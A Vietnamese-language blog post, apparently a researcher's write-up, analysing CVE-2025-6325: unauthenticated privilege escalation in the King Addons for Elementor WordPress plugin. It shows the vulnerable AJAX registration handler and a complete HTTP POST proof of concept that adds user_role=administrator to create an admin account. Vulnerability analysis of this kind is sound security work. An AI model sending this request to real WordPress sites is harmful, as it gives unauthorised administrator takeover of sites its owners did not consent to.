# CVE-2025-6325 Analysis & POC


<!--more-->

## CVE & Basic Info
**Lỗ hổng phân quyền không chính xác (Incorrect Privilege Assignment)** trong plugin **King Addons for Elementor** của **KingAddons.com** cho phép **leo thang đặc quyền (Privilege Escalation)**.
Lỗ hổng này ảnh hưởng đến **King Addons for Elementor** từ **không xác định (n/a)** đến **phiên bản 51.1.36 trở xuống (<= 51.1.36)**.

* **CVE ID**: [CVE-2025-6325](https://www.cve.org/CVERecord?id=CVE-2025-6325)
* **Vulnerability Type**: Privilege Escalation
* **Affected Versions**: <= 51.1.36
* **Patched Versions**: 51.1.37
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress King Addons for Elementor Plugin](https://wordpress.org/plugins/king-addons/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **King Addons for Elementor**:  
    * `51.1.14` – **vulnerable**  
    * `51.1.37` – **patched**
* **Elementor Plugin** → [**Elementor**](https://wordpress.org/plugins/elementor/)
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

> [!INFO]
> * Như cái tên **King Addons for Elementor**, plugin cần **Elementor** để hoạt động. Plugin này cung cấp nhiều widget và tính năng mở rộng cho **Elementor** nhằm hỗ trợ xây dựng giao diện website. 
> ![Widget](widget.png "Các widget của King Addons for Elementor")
> * Lỗ hổng được ghi nhận ảnh hưởng từ **không xác định (n/a)** đến **phiên bản `51.1.36` trở xuống**, tuy nhiên **trên thực tế lỗ hổng này đã được vá ở một số phiên bản nằm trong phạm vi được công bố**, do đó không phải tất cả các phiên bản được liệt kê đều còn tồn tại vấn đề bảo mật này.

## Analysis 
Khi thực hiện diff code giữa phiên bản được công bố là ảnh hưởng gần nhất (`v51.1.36`) và bản vá (`v51.1.37`) 

![Diff1](diff1.png "Diff code 1")

![Diff2](diff2.png "Diff code 2")

Quan sát sự thay đổi của các file trên, tôi không thấy có sự thay đổi nào liên quan đến lỗ hổng **Privilege Escalation**

Thực hiện search sink với phiên bản `v51.1.36`

![Sink](sink.png "Search sink v51.1.36")

Ta thấy, tại `file Login_Register_Form_Ajax.php`, hàm `Login_Register_Form_Ajax::handle_register_ajax()` cho phép nhận trực tiếp giá trị `$user_role` từ request và gán vào mảng `$user_data` trước khi gọi `wp_insert_user()` 

Đây chính là **sink** của lỗ hổng, vì dữ liệu đầu vào không đáng tin cậy được truyền vào trực tiếp, gây ra **Privilege Escalation**.

Hàm `handle_register_ajax()` được đăng ký làm callback cho action hook:

```php
add_action(
    'wp_ajax_nopriv_king_addons_user_register',
    ['King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax', 'handle_register_ajax']
);
```

Trong đó:

* `wp_ajax_nopriv_` là action hook dành cho **tất cả người dùng**, kể cả những người chưa đăng nhập.
* Khi gửi request tới endpoint `/wp-admin/admin-ajax.php` với `action=king_addons_user_register`, WordPress sẽ gọi `handle_register_ajax()`.
* `'King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax'` liên quan đến widget **Login/Register Form** của plugin **King Addons for Elementor**.
![Form](form.png "Login/Register Form của King Addons for Elementor")

=> Khi người dùng gửi form đăng ký này, dữ liệu nhập vào sẽ được **truyền trực tiếp vào hàm `handle_register_ajax()`** xử lý:

![Registration Enable](r_enable.png "Tính năng user registration")

Hàm chỉ tiếp tục xử lý nếu tính năng **user registration** được bật, ta có thể bật nó trong Admin Dashboard:

![Member Ship](membership.png "Bật tính năng user registration")

Khi tiếp tục phân tích phiên bản **v51.1.36**, tôi nhận thấy một comment giải thích rằng đoạn code bên dưới là **bản vá bảo mật**, nhằm chống **Privilege Escalation**.

![Analysis](analysis.png "Phần comment")

So sánh với danh sách các lỗ hổng đã công bố của plugin **King Addons for Elementor**:

![Compare](compare.png "So sánh")

* Trong danh sách này chỉ có **1 lỗ hổng Privilege Escalation** được ghi nhận.
* Tuy nhiên, ở phiên bản **v51.1.36**, lỗ hổng này đã được vá.

=> Điều này có nghĩa rằng **phiên bản v51.1.36 không còn có thể bị khai thác lỗ hổng này**.
Đây chính là lý do tại phần [**Requirements**](#requirements) tôi yêu cầu sử dụng phiên bản **v51.1.14**, vì phiên bản này **chưa chứa bản vá**, vẫn còn lỗ hổng để phục vụ phân tích hoặc thử nghiệm.

![Code v51.1.14](role.png "Code v51.1.14")

## Flow
{{< mermaid >}}
flowchart TD
A["Unauthenticated User"]
--> B["Submit Register Form (King Addons Login/Register Widget)"]

B --> C["POST /wp-admin/admin-ajax.php"]
C --> D["action=king_addons_user_register"]

D --> E["wp_ajax_nopriv_king_addons_user_register"]
E --> F["Login_Register_Form_Ajax::handle_register_ajax()"]

F --> G{"User Registration Enabled?"}
G -- No --> H["Abort"]
G -- Yes --> I["Read POST parameters"]

I --> J["user_role taken directly from request"]
J --> K["Build user_data array"]

K --> L["wp_insert_user(user_data)"]
L --> M["WordPress assigns role from user_role"]

M --> N["User account created with elevated role"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Submit form register và cho request đi qua Burp Proxy
2. Thêm `user_role` param với giá trị `administrator` vào request và gửi:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost

action=king_addons_user_register&nonce=2d3fdafcc0&email=abc%40gmail.com&username=abc&password=Hacker111%3F&confirm_password=Hacker111%3F&widget_id=c03756f&recaptcha_secret_key=&recaptcha_score_threshold=0.5&redirect_after_register=&terms_required=no&enable_user_email=yes&user_email_subject=Welcome+to+%7Bsite_name%7D!&user_email_content=Hello+%7Buser_name%7D%2C%0A%0AWelcome+to+%7Bsite_name%7D!%0A%0AYour+account+has+been+successfully+created.%0A%0AUsername%3A+%7Busername%7D%0AEmail%3A+%7Buser_email%7D%0A%0AThank+you+for+joining+us!%0A%0ABest+regards%2C%0A%7Bsite_name%7D+Team&enable_admin_email=no&admin_email_address=&admin_email_subject=&admin_email_content=&enable_mailchimp_integration=no&mailchimp_api_key=&mailchimp_list_id=&mailchimp_double_optin=no&auto_login_after_register=yes&user_role=administrator
```

![Result](result.png "Kết quả")

3. Login bằng tài khoản đã tạo

![Login](login.png "Login")

## Conclusion

Lỗ hổng **CVE-2025-6325** trong plugin **King Addons for Elementor** cho phép **Privilege Escalation** thông qua form đăng ký người dùng. Nguyên nhân chính là giá trị `user_role` được lấy trực tiếp từ request mà không kiểm tra trước khi gán cho tài khoản mới. Phiên bản **v51.1.14** vẫn chứa lỗ hổng này, trong khi **v51.1.36** đã được vá, do đó không thể khai thác nữa. Việc phân tích diff giữa các phiên bản cho thấy bản vá giới hạn role được phép và tránh tình trạng người dùng gán role nguy hiểm như `administrator`.

## Key Takeaways

* Lỗ hổng xuất phát từ **thiếu kiểm soát input (untrusted input)** trong hàm xử lý đăng ký AJAX.
* `wp_ajax_nopriv_` cho phép **người dùng chưa đăng nhập** gửi request tới endpoint và khai thác lỗ hổng.
* Bản vá giới hạn danh sách role được phép (`subscriber`, `customer`) để **ngăn leo thang đặc quyền**.
* Khi phân tích lỗ hổng, luôn so sánh **phiên bản vulnerable vs patched** để xác định thay đổi bảo mật.
* Sử dụng phiên bản **cũ (v51.1.14)** có thể phục vụ mục đích phân tích hoặc PoC, nhưng không nên triển khai trên môi trường production.

## References
[Privilege Escalation](https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/)

[WordPress King Addons for Elementor Plugin <= 51.1.36 is vulnerable to a high priority Privilege Escalation](https://patchstack.com/database/wordpress/plugin/king-addons/vulnerability/wordpress-king-addons-for-elementor-plugin-51-1-36-privilege-escalation-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2026-01-03-cve-2025-6325/  

